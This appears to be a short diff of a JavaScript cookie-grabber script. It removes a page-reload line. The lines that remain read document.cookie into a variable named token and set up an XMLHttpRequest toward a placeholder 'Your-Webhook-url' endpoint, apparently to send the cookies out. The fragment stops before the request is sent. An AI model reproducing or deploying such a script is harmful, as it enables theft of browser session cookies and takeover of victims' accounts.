@@ -1,4 +1,3 @@
-location.reload();
 var webhook = "Your-Webhook-url";
 var token = document.cookie;
 var request = new XMLHttpRequest();
